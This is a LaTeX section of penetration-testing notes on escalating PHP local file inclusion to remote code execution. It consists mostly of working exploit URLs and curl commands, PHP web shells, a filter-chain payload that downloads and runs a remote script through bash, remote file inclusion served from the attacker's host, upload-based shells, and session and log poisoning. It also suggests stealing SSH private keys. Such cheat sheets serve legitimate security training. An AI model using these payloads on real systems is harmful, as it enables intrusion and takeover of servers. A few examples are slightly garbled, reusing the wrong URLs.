\section{Remote Code Execution}


\subsection{PHP wrappers}

We can use many methods to execute remote commands, each of which has a
specific use case, as they depend on the back-end language/framework  and the
vulnerable function's capabilities. One easy and common method  for gaining
control over the back-end server is by enumerating user  credentials and SSH
keys, and then use those to login to the back-end  server through SSH or any
other remote session. For example, we may find  the database password in a file
like config.php, which may match a user's password in case they re-use the same
password. Or we can check the \verb+.ssh+  directory in each user's home
directory, and if the read privileges are  not set properly, then we may be
able to grab their private key and use it to SSH into the system.

Other than such trivial methods, there are ways to achieve remote  code
execution directly through the vulnerable function without relying  on data
enumeration or local file privileges.  We can utilize different \emph{PHP
Wrappers} to gain remote code execution.


\subsubsection{Config Extraction}

\begin{itemize}
\item Apache: \verb+/etc/php/X.Y/apache2/php.ini+ 
\item Nginx: \verb+/etc/php/X.Y/fpm/php.ini+
\end{itemize}

\begin{verbatim}
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
\end{verbatim}


\subsubsection{Data wrapper}
The data wrapper can be used to include external data, including PHP code.
However, the data wrapper is only available to use if the
\verb+allow_url_include+  setting is enabled in the PHP configurations.


Payload:
\begin{verbatim}
$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
\end{verbatim}

Exploit:

\begin{verbatim}
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
\end{verbatim}

\subsubsection{Input wrapper}
the payload is passed to the input wrapper as a POST request's data and depend
on \verb+allow_url_include+


\begin{verbatim}
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"
\end{verbatim}

\subsubsection{Expect wrapper}
\verb+Expect  wrapper+,allows to directly run commands through URL streams.  Expect don't need to provide a web shell, as it is designed to execute  commands.

\begin{verbatim}
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"

\end{verbatim}

\subsection{PHP Filters}

According to
\href{https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d}{this
article} php filters can be used to generate arbitrary content as output. Which
basically means that you can generate arbitrary php code for the \verb+include+
without needing to write it into a file.

\href{https://github.com/synacktiv/php_filter_chain_generator}{php\_filter\_chain\_generator}
tool

consider the following code:
\begin{verbatim}
if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page);

} 
\end{verbatim}
and considere the \verb+allow_url_include+ is enabled


\begin{verbatim}
$ python3 php_filter_chain_generator.py \
    --chain '<?= `curl http://x.x.x.x/c|bash` ;?>'
\end{verbatim}


\subsection{Remote File Inclusion}
Some of the functions (if vulnerable) allow remote file inclusion.

\subsubsection{Verify RFI}
Any remote  URL inclusion in PHP would require the \verb+allow_url_include+ setting to be enabled. 

Try with local URL (avoid including same page for infinit recursion)

\begin{verbatim}
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/<PAGE>.php
\end{verbatim}

Check if the index.php is executed.

\subsubsection{Create payload}
\begin{verbatim}
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
\end{verbatim}

\subsubsection{Host payload and exploit}
\begin{verbatim}
# #####
#  HTTP: python3 -m http.server <LISTENING_PORT>
# #####

http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

# #####
#  FTP: python -m pyftpdlib -p 21
# #####
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

# #####
#  SMB: impacket-smbserver -smb2support share $(pwd)
# #####

http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
\end{verbatim}

\subsection{LFI and file upload}

\subsubsection{Image upload}
\begin{enumerate}
    \item \textbf{Craft the payload}:
\begin{verbatim}
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
\end{verbatim}
    \item \textbf{locate the payload URL}: possible solution with fuzzing the
        upload directory
    \item \textbf{Exploit}:
\begin{verbatim}
http://<SERVER_IP>:<PORT>/index.php?language=<PATH_TO_IMG>/shell.gif&cmd=id
\end{verbatim}
\end{enumerate}



\subsubsection{Zip upload}
to exploit the \verb+zip+ wrapper

\begin{verbatim}
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php


http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
\end{verbatim}

\subsubsection{Phar upload}
to exploit the \verb+phar+ wrapper

\begin{verbatim}
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
\end{verbatim}

\subsection{Log Poisoning}
Writing PHP code  in a controled field  that gets logged into a log file and
then include that log file to execute the PHP code.

\subsubsection{PHP session poisoning}
Most PHP web applications utilize PHPSESSID cookies These  details are stored
in session files on the back-end, and saved in \verb+/var/lib/php/sessions/+
(\verb+C:\Windows\Temp\+). The name of the file that contains our user's data
matches the name of our PHPSESSID cookie with the \verb+sess_+ prefix.

\begin{enumerate}
    \item \textbf{Get the content of the session file}:
        \begin{verbatim}
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<SESSID>
        \end{verbatim}
    \item \textbf{Identify a parameter controled}: try to set an identifiable
        value to a parameter of a dynamic page and see if it is reflected in
        the session file.
    \item \textbf{Exploit}: craft the payload and set it as value of the
        parameter reflected in the sesssion and inclue the session file with
        parameter
        \begin{verbatim}
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<SESSID>&cmd=id
        \end{verbatim}

\end{enumerate}



\subsubsection{Server Log Poisoning}
the \verb+access.log+ file contains various information about all requests made to the
server, including each request's i\verb+User-Agent+ header that is controled.

By default:
\begin{itemize}
        \item Apache logs: \verb+/var/log/apache2/+
            (\verb+C:\xampp\apache\logs\+)
        \item Nginx logs: \verb+/var/log/nginx/+ (\verb+C:\nginx\log\+)
\end{itemize}

try also fuzzing with \verb+ SecLists/Fuzzing/LFI/+.

perform a LFI of the cache and check:
\begin{verbatim}
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
\end{verbatim}

Tip: Logs tend to be huge, and loading them in an  LFI vulnerability may take a while to load, or even crash the server in  worst-case scenarios. So, be careful and efficient with them in a  production environment, and don't send unnecessary requests.
\begin{verbatim}
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'


http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
\end{verbatim}

Tip: The User-Agent header is also shown on process files under the Linux
\verb+/proc/+ directory. So, we can try including the \verb+/proc/self/environ+
or \verb+/proc/self/fd/N+  files (where N is a PID usually between 0-50), and we may be able to  perform the same attack on these files. This may become handy in case we  did not have read access over the server logs, however, these files may  only be readable by privileged users as well.

Finally, there are other similar log poisoning techniques that we may  utilize on various system logs, depending on which logs we have read  access over. The following are some of the service logs we may be able  to read:
\begin{verbatim}
\item \verb+/var/log/sshd.log+
\item \verb+/var/log/mail+
\item \verb+/var/log/vsftpd.log+
\end{verbatim}

